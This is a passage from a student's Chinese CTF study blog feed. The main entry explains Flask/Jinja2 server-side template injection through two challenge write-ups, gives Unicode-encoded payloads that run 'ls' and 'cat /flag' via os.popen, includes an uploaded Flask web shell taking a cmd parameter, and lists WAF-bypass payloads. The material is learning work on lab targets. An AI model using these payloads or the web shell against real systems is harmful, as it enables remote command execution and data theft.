src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741450294894-6161c9e4-48bb-4611-ba8e-34a724776e22.png"></p><p>NSSCTF{fd8be297-d8d0-4909-90ef-574e11739831}</p><p>燃尽了先写到这里吧</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2025 Win SSTI</title>
      <link href="/2025/01/27/2025Win/2025%20Win%20SSTI/"/>
      <url>/2025/01/27/2025Win/2025%20Win%20SSTI/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/>学习文章：<p><a href="https://blog.csdn.net/2301_76690905/article/details/134301620">最全SSTI模板注入waf绕过总结（6700+字数！）</a></p><p><a href="https://tttang.com/archive/1698/">FLask SSTI从零到入门 - 跳跳糖</a></p><p><a href="https://blog.csdn.net/m0_74824534/article/details/144319392">使用Python Flask搭建一个简单的Web站点并发布到公网上访问</a></p><h1 id="i72Mc">一、刷题</h1><h2 id="OlTjg">（一）<font style="color:rgb(0, 0, 0);">[安洵杯 2020]Normal SSTI</font></h2>进到靶场只有一下信息<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737830123003-eb48d622-5ef2-4b45-8090-d26b1f4c7d4b.png"></h2><br>随便试几个数</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737831383793-89adc068-03cf-4493-8b2e-730533d38c91.png"></p><p><font style="color:rgb(77, 77, 77);">这一题关键在于用Unicode编码绕过点和下划线的过滤和用{{ “{%” }}%}绕过{{ “{{“ }}的过滤</font></p><p><font style="color:rgb(48, 49, 51);">这个只要知道了用编码绕过就很好解</font></p><p><font style="color:rgb(48, 49, 51);">学习了一些知识后知道了：</font></p><p><font style="color:rgb(48, 49, 51);">过滤了{{ }}可以使用{% print() %}</font></p><p><font style="color:rgb(48, 49, 51);">因为.和[]被过滤，所以使用flask的|attr来调用方法</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;|attr(&quot;__class__&quot;)等于</span><br><span class="line">&#x27;&#x27;.__class__</span><br></pre></td></tr></table></figure><p><font style="color:rgb(48, 49, 51);">如果要使用xxx.os(‘xxx’)类似的方法，可以使用</font></p><p><font style="color:rgb(48, 49, 51);">xxx|attr(“os”)(‘xxx’)</font></p><p>用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class_name = <span class="string">&quot;__class__&quot;</span></span><br><span class="line">unicode_class_name = <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;\\u&#123;:04x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(char)) <span class="keyword">for</span> char <span class="keyword">in</span> class_name])</span><br><span class="line"><span class="built_in">print</span>(unicode_class_name)</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f</span><br></pre></td></tr></table></figure><p>所以先构造playload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=&#123;%print(()|attr(%22\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f%22))%&#125;</span><br></pre></td></tr></table></figure><p>得到</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737832210924-4e868c58-1704-4b8d-9e3f-cf30ad565fb4.png"></p><p>再试试字典：__globals__</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f</span><br></pre></td></tr></table></figure><p>得到</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737832712618-303f5e65-865f-42fd-8a66-293c92cfb6a1.png"></p><p>其中</p><p><font style="color:rgb(48, 49, 51);">使用flask里的lipsum方法，来</font><font style="color:rgb(77, 77, 77);">引用popen，查目录，</font><font style="color:rgb(48, 49, 51);">执行命令</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lipsum|attr(&quot;__globals__&quot;).get(&quot;os&quot;).popen(&quot;ls&quot;).read()</span><br></pre></td></tr></table></figure><p>即</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=&#123;%print(lipsum|attr(%22\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f%22)|attr(%22\u0067\u0065\u0074%22)(%22os%22)|attr(%22\u0070\u006f\u0070\u0065\u006e%22)(%22\u006c\u0073\u0020\u002f%22)|attr(%22\u0072\u0065\u0061\u0064%22)())%&#125;</span><br></pre></td></tr></table></figure><p>其中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__globals__：\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f</span><br><span class="line"></span><br><span class="line">get：\u0067\u0065\u0074</span><br><span class="line"></span><br><span class="line">popen：\u0070\u006f\u0070\u0065\u006e</span><br><span class="line"></span><br><span class="line">read：\u0072\u0065\u0061\u0064</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737832992491-9fbd933c-e35d-4f2c-b203-8354d20aa3b4.png"></p><p>所以把popen(“ls”)中的ls 改为cat &#x2F;flag即可得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /flag：\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067\u0020</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737834033295-d7952507-cebe-4654-bd80-e1f6b3e88842.png"></p><h2 id="OuLqO">（二）<font style="color:rgb(33, 37, 41);">[NewStarCTF 2023 公开赛道]flask disk</font></h2>这道题的一开始已经提示我们端口为5000<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737877965836-7a3ac472-8dd6-480f-a6aa-3371a59081fa.png"></p><p>一进来是这个页面</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737878183154-8e83ed8c-3433-4fc7-9c2b-2e59c175ac51.png"></p><p>打开list files发现有这个文件</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737878221076-7b5f0d8e-e6a6-424f-beb4-693215f920d2.png"></p><p>打开upload files，这个则是一个正常的文件上传</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737878278144-0cf0c5d1-f4ec-4e0c-bccb-9d69c715ab45.png"></p><p>打开admin manage，则发现要输入密码，大佬应该会爆破吧，我是小白，这题还是考SSTI的题，所以还是正常写吧</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737878312134-cdd6e463-d35d-407b-bfb8-cbe09f29e3e5.png"></p><p>简单上传了一个文件后出现如下页面</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737878491424-448972e5-2e8f-48f0-a149-d9c0dc8ed43a.png"></p><p>之后又上传了几个文件后发现，可以构造同名脚本来代替原来的Python文件，其中要有cmd来执行cat &#x2F;flag命令从而获取flag，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cmd=request.args.get(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">        a=os.popen(cmd).read()</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">5000</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>上传后页面全都找不到了，说明替换成功了，毕竟我们上传的文件没有这个功能的<br><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737878650248-006cc086-717a-44c6-b693-f4834649d00a.png"></p><p>直接cat &#x2F;flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=cat /flag</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737877947612-028bfd31-cf84-475e-aaeb-2c6af1a94684.png"></p><h1 id="JtqVP">二、<font style="color:rgba(0, 0, 0, 0.87);">WAF简单绕过方式总结</font></h1><h3 id="hvzyx"><font style="color:rgb(79, 79, 79);">1、{%%}绕过过滤{{}}</font></h3>可以用 <font style="color:rgb(79, 79, 79);">{%%} 来代替 {{}}，想要看到内容就用 print 输出一下,即</font><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(&quot;&quot;.__class__)%&#125;</span><br></pre></td></tr></table></figure><h3 id="2%E3%80%81getitem()%E7%BB%95%E8%BF%87%5B%5D%E8%BF%87%E6%BB%A4"><font style="color:rgb(79, 79, 79);">2、getitem()绕过[]过滤</font></h3><font style="color:rgb(77, 77, 77);">getitem() 是python的一个魔术方法,对字典使用时,传入字符串,返回字典相应键所对应的值:当对列表使用时,传入整数返回列表对应索引的值。</font><p><font style="color:rgb(77, 77, 77);">例如：当中括号被过滤时，就用下述方法来代替[]</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__getitem__( )代替[ ]</span><br></pre></td></tr></table></figure><h3 id="3%E3%80%81request%E6%96%B9%E6%B3%95%E7%BB%95%E8%BF%87%EF%BC%9A"><font style="color:rgb(79, 79, 79);">3、</font><font style="color:rgb(8, 8, 8) !important;">request</font><font style="color:rgb(79, 79, 79);">方法绕过：</font></h3><font style="color:rgb(77, 77, 77);">request在flask中可以访问基于 HTTP 请求传递的所有信息</font><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">request.args.key  #获取get传入的key的值</span><br><span class="line">request.form.key  #获取post传入参数(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">reguest.values.key  #获取所有参数，如果get和post有同一个参数，post的参数会覆盖get</span><br><span class="line">request.cookies.key  #获取cookies传入参数</span><br><span class="line">request.headers.key  #获取请求头请求参数</span><br><span class="line">request.data  #获取post传入参数(Content-Type:a/b)</span><br><span class="line">request.json  #获取post传入json参数 (Content-Type: application/json)</span><br></pre></td></tr></table></figure><h3 id="4%E3%80%81%E7%BB%95%E8%BF%87%E4%B8%8B%E5%88%92%E7%BA%BF%E8%BF%87%E6%BB%A4%3A"><font style="color:rgb(79, 79, 79);">4、绕过下划线过滤:</font></h3>可以使用Unicode编码<p>①’’|attr(“__class__“)等效于’’.__class__</p><p>②如果要使用xxx.os(‘xxx’)类似的方法，可以使用xxx|attr(“os”)(‘xxx’)</p><p>③使用flask里的lipsum方法来执行命令：flask里的lipsum方法,可以用于得到__builtins__，而且lipsum.__globals__含有os模块</p><p>得到Unicode编码的python脚本为：（以”cat &#x2F;flag”为例子：）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class_name = <span class="string">&quot;cat /flag&quot;</span></span><br><span class="line">unicode_class_name = <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;\\u&#123;:04x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(char)) <span class="keyword">for</span> char <span class="keyword">in</span> class_name])</span><br><span class="line"><span class="built_in">print</span>(unicode_class_name)</span><br></pre></td></tr></table></figure><p>则得到playload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=&#123;%print(()|attr(%22\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f%22))%&#125;</span><br></pre></td></tr></table></figure><h3 id="CwRbv">5、绕过点过滤</h3>设有代码<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.base__.__subclasses__()[117].__init__.__globals__.os.popen(&quot;ls&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><ul><li><strong><font style="color:rgb(79, 79, 79);">中括号[]代替点</font></strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[&#x27;class&#x27;][&#x27;base&#x27;][&#x27;subclasses&#x27;]()[117][&#x27;init&#x27;][&#x27;globals&#x27;][&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;ls&#x27;)[&#x27;read&#x27;]()&#125;&#125;</span><br></pre></td></tr></table></figure><ul><li><strong><font style="color:rgb(79, 79, 79);">attr()绕过（当中括号也被过滤时使用）</font></strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(&#x27;__class__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)()|attr(&#x27;__getitem__&#x27;)(177)|attr(&#x27;__init__&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;os&#x27;)|attr(&#x27;popen&#x27;)(&#x27;ls&#x27;)|attr(&#x27;read&#x27;)()&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="ZI3cB">6、绕过关键字过滤:</h3><font style="color:rgb(79, 79, 79);">1、编码绕过</font><p><font style="color:rgb(79, 79, 79);">即使用Unicode编码绕过</font></p><p><font style="color:rgb(79, 79, 79);">2、”+”拼接</font></p><p><font style="color:rgb(77, 77, 77);">{{().__class__}}等效于{{()[‘__cla’+’ss__‘]}}</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[&#x27;__cla&#x27;+&#x27;ss__&#x27;][&#x27;__ba&#x27;+&#x27;se__&#x27;] [ &#x27;__subc&#x27;+&#x27;__lasses__&#x27;][&#x27;__ get&#x27;+&#x27;item__&#x27;](177)[&#x27;__in&#x27;+&#x27;it__&#x27;][&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__geti&#x27;+&#x27;tem__&#x27;](&#x27;os&#x27;)[&#x27;po&#x27;+&#x27;pen&#x27;](&#x27;ls&#x27;)[&#x27;read&#x27;]()&#125;&#125;</span><br></pre></td></tr></table></figure><p><font style="color:rgb(79, 79, 79);">3、Jinjia2中的拼接</font></p><p><font style="color:rgb(77, 77, 77);">{{()[‘__class__‘]}}等价于{%set a&#x3D;’__cla’%}{%set b&#x3D;’ss__‘%}{{()[a~b]</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set a=&#x27;__cla&#x27;%&#125;&#123;%set b=&#x27;ss__&#x27;%&#125;&#123;%set c=&#x27;__ba&#x27;%&#125;&#123;%set d=&#x27;se__&#x27;%&#125;&#123;%set e=&#x27;__subcl&#x27;%&#125;&#123;%set f=&#x27;asses__&#x27;%&#125;&#123;%set g=&#x27;__in&#x27;%&#125;&#123;%set h=&#x27;it__&#x27;%&#125;&#123;%set l=&#x27;__gl&#x27;%&#125;&#123;%set i=&#x27;obals__&#x27;%&#125;&#123;%set i=&#x27;po&#x27;%&#125;&#123;%set k=&#x27;pen&#x27;%&#125;&#123;&#123;&quot;&quot;[a~b][c~d][e~f]()[19][g~h][l~i][&#x27;os&#x27;][j~k](&#x27;ls&#x27;)[&#x27;read&#x27;]()&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="g2wb9"><font style="color:rgb(77, 77, 77);">7、绕过符号过滤</font></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set a=(&#123;&#125;|select()|string()) %&#125;&#123;&#123;a&#125;&#125; #获取下划线</span><br><span class="line">&#123;% set a=(&#123;&#125;|self|string()) %&#125; &#123;&#123;a&#125;&#125; #获取空格</span><br><span class="line">&#123;% set a=(self|string|urlencode) %&#125;&#123;&#123;a&#125;&#125;  #获取百分号</span><br></pre></td></tr></table></figure><h1 id="FD22M"><font style="color:rgba(0, 0, 0, 0.87);">三、Flask开发小网站</font></h1><h3 id="hEwhD">先上效果</h3>![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737898322502-cad5dfd0-7f27-4e3e-8349-196239935e00.png)<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737909252297-ab5b5aaf-35cf-4741-896f-0603620c03da.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737898391216-23a44fee-582e-4424-acf6-31769650232c.png"></p><h3 id="ayfCd">主要代码如下：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, flash</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&quot;manbearpig_MUDMAN888&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    flash(<span class="string">&quot;what&#x27;s your name?&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/greet&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">greeter</span>():</span><br><span class="line">    flash(<span class="string">&quot;Hi &quot;</span> + <span class="built_in">str</span>(request.form[<span class="string">&#x27;name_input&#x27;</span>]) + <span class="string">&quot; ! Great to see you !&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Happy New Year!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;css/main.css&#x27;) &#125;&#125;&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;images/FE98E0BC7145D052591D5F1F9F9C0B87.jpg&#x27;) &#125;&#125;&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;本地图片&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;greet&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">      &#123;% for message in get_flashed_messages() %&#125;</span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      &#123;% endfor %&#125;</span><br><span class="line">      <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name_input&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入你的名字&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;GREET&quot;</span> <span class="attr">id</span>=<span class="string">&quot;greet&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Happy New Year!<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">  <span class="attribute">background-color</span>: SlateGrey;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: white;</span><br><span class="line">  <span class="attribute">font-family</span>: Shanti;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">1.2em</span>;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">margin</span>:  <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">img</span> &#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">60px</span> <span class="number">0</span> <span class="number">30px</span> <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">250px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">input</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">20px</span> <span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line">  <span class="attribute">border</span>: none;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">font-family</span>: Shanti;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">1.3em</span>;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">input</span><span class="selector-pseudo">:focus</span> &#123;</span><br><span class="line">  <span class="attribute">outline</span>: none;</span><br><span class="line">  <span class="attribute">border</span>: solid <span class="number">5px</span> <span class="number">#00FFCE</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#greet</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: PaleVioletRed;</span><br><span class="line">  <span class="attribute">border</span>:  none;</span><br><span class="line">  <span class="attribute">width</span>:  <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">color</span>: white;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#greet</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: MediumVioletRed;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>暂时利用cpolar搭建一个公网来看吧：</p><p><a href="https://21023c45.r18.cpolar.top/">https://21023c45.r18.cpolar.top</a></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737909000763-2c65b890-d81b-49a2-ba0e-04f2b4f550b0.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737909000532-7a051df1-8085-4445-b79c-6565304035c9.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737909001126-985fdddf-3872-4c21-b9e7-bac628204669.png">    </p>]]></content>
      
      
      <categories>
          
          <category> 2025Win </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Training </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025 Win 反序列化</title>
      <link href="/2025/01/23/2025Win/2025%20Win%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2025/01/23/2025Win/2025%20Win%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="一、讲义内作业"><a href="#一、讲义内作业" class="headerlink" title="一、讲义内作业"></a><font style="color:#000000;">一、讲义内作业</font></h1><ul><li><strong><font style="color:#000000;">PCRE回溯次数限制：</font></strong></li></ul><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737463576895-1c81abcb-0bbf-4284-8b59-fc75dd4a6eb8.png"></p><p><font style="color:#000000;">图中第5步有红颜色，表示匹配不成功。此时b{1,3}已经匹配到了2个字符“b”，准备尝试第三个时，结果发现接下来的字符是“c”。那么就认为b{1,3}就已经匹配完毕。然后状态又回到之前的状态（即第6步，与第4步一样），最后再用子表达式c，去匹配字符“c”。当然，此时整个表达式匹配成功了preg_match的匹配存在回溯，回溯次数上限是1000000次，超过上限</font><font style="color:#000000;">后函数</font><font style="color:#000000;">直接返回false。</font></p><ul><li><strong><font style="color:#000000;">fastcoll 工具</font></strong></li></ul><p><font style="color:#000000;">内容不同但是md5值是相同的</font><font style="color:#000000;">，伟大！无需多言！</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737467807110-f79b6646-16d9-427c-b576-865339160fa0.png"></p><p><font style="color:#000000;">其中被解析的字符第三行开头就有不一样的</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737468161698-806eaab2-802e-4d16-a596-c9bcb2137ccd.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737468183901-67b36a9e-e47b-4f30-ac58-40cb80e67491.png"></p><ul><li><strong><font style="color:#000000;">is_numeric()函数—获取变检测变量是否为数字或数字字符串</font></strong><ul><li><font 